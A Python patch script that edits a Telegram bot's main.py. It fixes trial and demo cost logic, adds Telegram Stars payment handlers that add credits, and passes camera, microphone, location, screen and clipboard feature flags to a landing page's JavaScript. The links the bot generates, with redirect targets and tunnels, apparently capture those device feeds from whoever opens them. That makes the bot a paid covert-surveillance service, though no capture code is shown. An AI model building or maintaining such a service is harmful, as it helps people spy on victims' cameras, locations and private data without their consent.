import sys, pathlib, py_compile

HERE = pathlib.Path(__file__).parent
main_py = HERE / "main.py"
src = main_py.read_text(encoding="utf-8")

def sub_once(text, old, new, label):
    n = text.count(old)
    if n == 0:
        print(f"  [!] {label}: pattern not found")
        return text, False
    if n > 1:
        print(f"  [!] {label}: {n} matches — replacing first only")
    return text.replace(old, new, 1), True

ok = True

# ── Patch A: fix broken is_trial cost block in user_gen ──
old_a = '''        # ═══ Free trial — non-whitelisted camera = 0 cost ═══
        is_trial = (not is_allowed(u.id)) and feat == "camera"
        if is_trial:
            cost = 0
        else:
            if is_trial:
            cost = 0
        else:
            cost = 0 if is_demo else feature_cost(feat)
'''
new_a = '''        # ═══ Free trial — non-whitelisted camera = 0 cost ═══
        is_trial = (not is_allowed(u.id)) and feat == "camera"
        if is_trial:
            cost = 0
        elif is_demo:
            cost = 0
        else:
            cost = feature_cost(feat)
'''
src, r = sub_once(src, old_a, new_a, "A: is_trial cost block"); ok = ok and r

# ── Patch B: add COMBO / COMBO_LABEL after FEATURES dict ──
old_b = '''    "notif":  {"label": "🔔 Notification", "facing": False},
}
'''
new_b = '''    "notif":  {"label": "🔔 Notification", "facing": False},
}

COMBO = "combo"
COMBO_LABEL = "🎯 All-in-One Combo"
'''
src, r = sub_once(src, old_b, new_b, "B: COMBO defs"); ok = ok and r

# ── Patch C: rewrite _flags_str to match JS-facing flag names ──
old_c = '''def _flags_str():
    """Build feature flags string for landing page."""
    out = []
    for k in ("camera","video","mic","call_hint","location","screen","clipboard"):
        try:
            if int(setting("flag_" + k, "1")) == 1:
                out.append(k)
        except Exception: pass
    return ",".join(out)
'''
new_c = '''def _flags_str():
    """Build feature flags string for landing page JS."""
    name_map = {"camera":"camera","video":"video","mic":"mic",
                "call":"call","loc":"loc","screen":"screen","clip":"clip"}
    out = []
    for python_key, js_name in name_map.items():
        try:
            if int(setting("flag_" + python_key, "1")) == 1:
                out.append(js_name)
        except Exception: pass
    return ",".join(out)
'''
src, r = sub_once(src, old_c, new_c, "C: _flags_str"); ok = ok and r

# ── Patch D1: __FEAT__ replace in r_auto ──
old_d1 = '''                       .replace("__AUTO_DEST__",auto_dest).replace("__FACING__",facing))'''
new_d1 = '''                       .replace("__AUTO_DEST__",auto_dest).replace("__FACING__",facing)
                       .replace("__FEAT__", _flags_str()))'''
src, r = sub_once(src, old_d1, new_d1, "D1: r_auto __FEAT__"); ok = ok and r

# ── Patch D2: __FEAT__ replace in r_custom ──
old_d2 = '''                       .replace("__AUTO_DEST__","").replace("__FACING__","user"))'''
new_d2 = '''                       .replace("__AUTO_DEST__","").replace("__FACING__","user")
                       .replace("__FEAT__", _flags_str()))'''
src, r = sub_once(src, old_d2, new_d2, "D2: r_custom __FEAT__"); ok = ok and r

# ── Patch E1: import PreCheckoutQueryHandler ──
old_e1 = '''                          ChatJoinRequestHandler)'''
new_e1 = '''                          ChatJoinRequestHandler, PreCheckoutQueryHandler)'''
src, r = sub_once(src, old_e1, new_e1, "E1: import handler"); ok = ok and r

# ── Patch E2: insert on_precheckout + on_stars_paid before ROUTER ──
old_e2 = '''# ═══════════ ROUTER ═══════════
async def on_pay_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):'''
new_e2 = '''async def on_precheckout(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        await update.pre_checkout_query.answer(ok=True)
    except Exception as e:
        record_error("precheckout", e)


async def on_stars_paid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        sp = update.message.successful_payment
        uid = update.effective_user.id
        try:
            credits = int(sp.invoice_payload.split("_")[2])
        except Exception:
            notify_admin("Stars paid - payload unparseable: " + str(sp.invoice_payload))
            return
        with DB_LOCK:
            c.execute("UPDATE users SET credits=credits+? WHERE id=?", (credits, uid))
            c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                      (uid, "stars_purchase", credits,
                       "stars:" + (sp.telegram_payment_charge_id or "")[:40], now()))
            conn.commit()
            r = c.execute("SELECT credits FROM users WHERE id=?", (uid,)).fetchone()
        set_setting("last_purchase_" + str(uid), str(int(time.time())))
        try:
            await update.message.reply_text(
                wrap("Payment received\\n+" + str(credits) + " credit\\nBalance: "
                     + str(r["credits"] if r else credits)),
                parse_mode="HTML")
        except Exception: pass
        notify_admin("Stars payment - id " + str(uid) + " - +" + str(credits) + " cr")
    except Exception as e:
        record_error("stars_paid", e)


# ═══════════ ROUTER ═══════════
async def on_pay_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):'''
src, r = sub_once(src, old_e2, new_e2, "E2: precheckout + stars_paid"); ok = ok and r

# ── Patch E3: register new handlers in main() ──
old_e3 = '''    app.add_handler(ChatJoinRequestHandler(on_join_req))
'''
new_e3 = '''    app.add_handler(ChatJoinRequestHandler(on_join_req))
    app.add_handler(PreCheckoutQueryHandler(on_precheckout))
    app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, on_stars_paid))
'''
src, r = sub_once(src, old_e3, new_e3, "E3: register handlers"); ok = ok and r

# ── Patch F: last_purchase timestamp on payment approve ──
old_f = '''                ur = c.execute("SELECT credits FROM users WHERE id=?", (p["user_id"],)).fetchone()
                bal = ur["credits"] if ur else p["credits"]
'''
new_f = '''                ur = c.execute("SELECT credits FROM users WHERE id=?", (p["user_id"],)).fetchone()
                bal = ur["credits"] if ur else p["credits"]
            set_setting("last_purchase_" + str(p["user_id"]), str(int(time.time())))
'''
src, r = sub_once(src, old_f, new_f, "F: last_purchase on approve"); ok = ok and r

# ── Patch G: mark daily-free as used in _do_gen ──
old_g = '''        # ═══ STEP 4: Mark trial / demo used ═══
        try:
            if feat == "camera" and (not is_allowed(u.id)) and cost == 0:
                set_setting("camera_trial_" + str(u.id), "1")
                log(f"_do_gen: trial marked for {u.id}")
        except Exception as e:
            log(f"_do_gen trial mark fail: {e}")
'''
new_g = '''        # ═══ STEP 4: Mark trial / demo used ═══
        try:
            if feat == "camera" and (not is_allowed(u.id)) and cost == 0:
                set_setting("camera_trial_" + str(u.id), "1")
                log(f"_do_gen: trial marked for {u.id}")
            elif cost == 0 and is_allowed(u.id):
                today = datetime.utcnow().strftime("%Y-%m-%d")
                set_setting("daily_" + str(u.id) + "_" + feat, today)
                log(f"_do_gen: daily marked for {u.id}/{feat}")
        except Exception as e:
            log(f"_do_gen mark fail: {e}")
'''
src, r = sub_once(src, old_g, new_g, "G: daily marker"); ok = ok and r

# ── Patch H: u:gen: facing branch honours daily-free ──
old_h = '''        if d.startswith("u:gen:"):
            parts = d.split(":", 3)
            feat = parts[2]; facing = parts[3]
            # ═══ Free trial — non-whitelisted camera = 0 cost ═══
            is_trial = (not is_allowed(u.id)) and feat == "camera"
            cost = 0 if is_trial else feature_cost(feat)
            log("u:gen: feat=" + feat + " facing=" + facing + " cost=" + str(cost) + " trial=" + str(is_trial))
            try:
                await _do_gen(q, ctx, u, feat, cost, facing)
            except Exception as e:
                log("u:gen FAIL: " + str(e)[:200])
                record_error("u_gen", e)
            return
'''
new_h = '''        if d.startswith("u:gen:"):
            parts = d.split(":", 3)
            feat = parts[2]; facing = parts[3]
            is_trial = (not is_allowed(u.id)) and feat == "camera"
            is_demo = False
            if is_allowed(u.id):
                try:
                    today = datetime.utcnow().strftime("%Y-%m-%d")
                    if setting("daily_" + str(u.id) + "_" + feat, "") != today:
                        is_demo = True
                except Exception: pass
            cost = 0 if (is_trial or is_demo) else feature_cost(feat)
            log("u:gen: feat=" + feat + " facing=" + facing + " cost=" + str(cost)
                + " trial=" + str(is_trial) + " demo=" + str(is_demo))
            try:
                await _do_gen(q, ctx, u, feat, cost, facing)
            except Exception as e:
                log("u:gen FAIL: " + str(e)[:200])
                record_error("u_gen", e)
            return
'''
src, r = sub_once(src, old_h, new_h, "H: u:gen: branch"); ok = ok and r

# ── Patch I: don't burn trial before tunnel check ──
old_i = '''            # Mark trial NOW so 2nd click blocks even if link abandoned
            set_setting("camera_trial_" + str(u.id), "1")
            log("camera trial used: " + str(u.id))
'''
new_i = '''            # Trial marked later inside _do_gen — only after link row is committed
            log("camera trial ready for: " + str(u.id))
'''
src, r = sub_once(src, old_i, new_i, "I: defer trial mark"); ok = ok and r

main_py.write_text(src, encoding="utf-8")

try:
    py_compile.compile(str(main_py), doraise=True)
    print("  [OK] main.py compiles clean")
except py_compile.PyCompileError as e:
    print("  [!] COMPILE FAIL:")
    print(e)
    ok = False

print("== PATCH DONE ==" if ok else "== PATCH PARTIAL — read [!] lines ==")
sys.exit(0 if ok else 1)
